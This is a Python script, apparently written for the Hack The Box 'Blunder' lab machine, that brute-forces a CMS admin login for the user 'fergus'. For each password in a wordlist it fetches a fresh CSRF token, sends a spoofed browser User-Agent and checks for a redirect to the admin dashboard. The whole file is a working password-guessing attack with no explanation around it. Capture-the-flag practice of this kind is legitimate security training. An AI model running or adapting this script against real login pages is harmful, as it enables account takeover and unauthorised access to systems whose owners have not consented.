import re
import requests
#from __future__ import print_function


def split_wordlist(file_path):
    wordlists = open(file_path, 'r')
    array = []
    for password in wordlists:
        password = password.replace("\n", "")
        array.append(password)
    return array


login_url = 'http://blunder.htb/admin/login'
username = 'fergus'
wordlist = split_wordlist('/home/zeruel/hackthebox/blunder/wordlists.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search(
        'name="tokenCSRF" value="(.+?)"', login_page.text).group(1)

    print('[*] Trying with password: {p}'.format(p=password))

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(
        login_url, headers=headers, data=data, allow_redirects=False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print
            print('--------SUCCESS--------')
            print('{u}:{p}'.format(u=username, p=password))
            print('-----------------------')
            break
